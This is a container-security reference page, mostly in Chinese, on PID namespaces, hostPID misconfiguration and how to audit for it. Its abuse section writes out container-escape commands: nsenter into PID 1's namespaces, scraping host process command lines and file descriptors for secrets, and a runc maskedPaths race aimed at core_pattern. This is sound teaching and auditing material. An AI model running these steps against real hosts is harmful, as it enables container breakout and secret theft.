# PID 命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

PID 命名空间控制进程如何编号以及哪些进程可见。这就是为什么容器可以有自己的 PID 1，尽管它不是一台真实的机器。在命名空间内部，工作负载看到的看起来像是本地的进程树。命名空间外部，宿主仍然看到真实的主机 PID 和完整的进程全景。

从安全角度看，PID 命名空间很重要，因为进程可见性具有价值。一旦工作负载能够看到宿主进程，它可能会观察到服务名称、命令行参数、通过进程参数传递的秘密、通过 `/proc` 派生的环境状态，以及潜在的命名空间进入目标。如果它不仅仅是查看这些进程，例如在合适的条件下发送信号或使用 ptrace，那么问题会变得更加严重。

## 工作原理

新的 PID 命名空间从其自身的内部进程编号开始。第一个在其中创建的进程从该命名空间的角度看成为 PID 1，这也意味着它在孤儿子进程和信号行为方面具有类似 init 的特殊语义。这解释了许多关于 init 进程、僵尸进程回收以及为什么有时在容器中使用小型 init 包装器的奇怪现象。

重要的安全教训是，一个进程可能看起来是隔离的，因为它只看到自己的 PID 树，但这种隔离可以被有意移除。Docker 通过 `--pid=host` 暴露这一点，而 Kubernetes 通过 `hostPID: true` 实现。一旦容器加入宿主 PID 命名空间，工作负载就能直接看到宿主进程，许多后续的攻击路径也会变得更加可行。

## 实验

要手动创建一个 PID 命名空间：
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
shell 现在看到一个私有的进程视图。`--mount-proc` 标志很重要，因为它挂载了一个 procfs 实例，该实例与新的 PID 命名空间匹配，使从内部看到的进程列表保持一致。

为了比较容器行为：
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
The difference is immediate and easy to understand, which is why this is a good first lab for readers.

## Runtime Usage

普通容器（在 Docker、Podman、containerd 和 CRI-O 中）会拥有自己的 PID namespace。Kubernetes Pods 通常也会获得隔离的 PID 视图，除非工作负载显式要求 host PID sharing。LXC/Incus 环境依赖相同的内核原语，但 system-container 的使用场景可能会暴露出更复杂的进程树并鼓励更多的调试捷径。

相同的规则在各处适用：如果 runtime 选择不隔离 PID namespace，那就是对容器边界的有意缩减。

## Misconfigurations

典型的错误配置是 host PID sharing。团队常以调试、监控或服务管理的便利性为理由，但这应始终被视为一个重要的安全例外。即便容器默认没有对主机进程的直接写入能力，仅可见性本身就能泄露大量系统信息。一旦加入了诸如 `CAP_SYS_PTRACE` 或有用的 procfs 访问等能力，风险会显著扩大。

另一个错误是假定由于工作负载默认不能 kill 或 ptrace 主机进程，因此 host PID sharing 无害。这个结论忽视了枚举的价值、可进入的命名空间目标的可用性，以及 PID 可见性与其他被弱化的控制相结合的方式。

## Abuse

如果共享了 host PID namespace，攻击者可能会检查主机进程、获取进程参数、识别有价值的服务、定位用于 `nsenter` 的候选 PID，或将进程可见性与与 ptrace 相关的特权结合起来，以干扰主机或相邻工作负载。在某些情况下，仅仅看到合适的长期运行进程就足以重塑其余的攻击计划。

第一步实际操作始终是确认主机进程是否真的可见：
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
一旦宿主 PIDs 可见，进程参数和 namespace-entry 目标通常成为最有用的信息来源：
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
如果 `nsenter` 可用并且具有足够权限，测试是否可以将可见的主机进程用作命名空间桥接：
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
即使入口被阻断，主机 PID 共享也很有价值，因为它揭示了服务布局、运行时组件，以及下一步可作为目标的候选特权进程。

主机 PID 可见性也使得文件描述符滥用更为现实。如果具有特权的主机进程或邻近的工作负载打开了敏感文件或 socket，攻击者可能能够检查 `/proc/<pid>/fd/` 并重用该句柄，具体取决于所有权、procfs 挂载选项和目标服务模型。
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
这些命令有用，因为它们可以判断 `hidepid=1` 或 `hidepid=2` 是否在减少跨进程可见性，以及像打开的 secret files、logs 或 Unix sockets 这样的明显感兴趣的描述符是否根本可见。

### 完整示例：host PID + `nsenter`

Host PID sharing 在进程也具有加入 host namespaces 的足够权限时，会直接成为一次 host escape：
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
如果该命令成功，容器进程现在就在主机的挂载、UTS、网络、IPC 和 PID 命名空间中执行。其影响是立即导致主机被妥协。

即使 `nsenter` 本身不存在，如果挂载了主机文件系统，也可能通过主机上的二进制文件实现相同结果：
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 最近运行时笔记

某些与 PID-namespace 相关的攻击并非传统的 `hostPID: true` 配置错误，而是发生在容器设置期间，关于如何应用 procfs 保护的运行时实现漏洞。

#### `maskedPaths` 争用主机上的 procfs

在易受漏洞影响的 `runc` 版本中，攻击者如果能控制容器镜像或 `runc exec` 的工作负载，可以通过将容器端的 `/dev/null` 替换为指向敏感 procfs 路径（例如 `/proc/sys/kernel/core_pattern`）的符号链接，从而与屏蔽阶段竞争。如果竞争成功，masked-path bind mount 可能会挂载到错误的目标，并向新容器暴露主机全局的 procfs 控制项。

有用的审查命令：
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
这很重要，因为最终影响可能与直接的 procfs 暴露相同：可写的 `core_pattern` 或 `sysrq-trigger`，随后可能导致 host code execution 或 denial of service。

#### Namespace injection with `insject`

像 `insject` 这样的 Namespace injection 工具表明，PID-namespace 的交互并不总是需要在创建进程之前预先进入目标命名空间。一个 helper 可以在稍后 attach，使用 `setns()`，并在保留对目标 PID 空间可见性的情况下执行：
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
这种技术主要适用于高级调试、offensive tooling 和 post-exploitation 工作流，尤其是在运行时已经初始化工作负载之后仍需加入命名空间上下文的情况下。

### 相关 FD 滥用模式

当主机 PID 可见时，有两种模式值得明确指出。首先，特权进程可能会在 `execve()` 之后仍保持敏感的文件描述符打开，因为它未被标记为 `O_CLOEXEC`。其次，服务可能通过 `SCM_RIGHTS` 在 Unix 套接字上传递文件描述符。在这两种情况下，关注点不再是路径名，而是低权限进程可能继承或接收的已经打开的句柄。

这在容器工作中很重要，因为该句柄可能指向 `docker.sock`、特权日志、主机秘密文件或其他高价值对象，即使路径本身在容器文件系统中不可直接访问。

## 检查

这些命令的目的是判断该进程是否拥有独立的 PID 视图，还是已经能够枚举更广泛的进程全景。
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- 如果进程列表包含明显的主机服务，很可能已经启用了主机 PID 共享。
- 仅看到一个非常小的容器本地进程树是正常基线；看到 `systemd`、`dockerd` 或无关的守护进程则不是。
- 一旦能看到主机 PID，即使是只读的进程信息也会成为有用的 reconnaissance。

如果你发现某个容器以主机 PID 共享方式运行，不要把它当作表面差异。它在工作负载所能观察到并可能影响的范围上是一个重大变化。
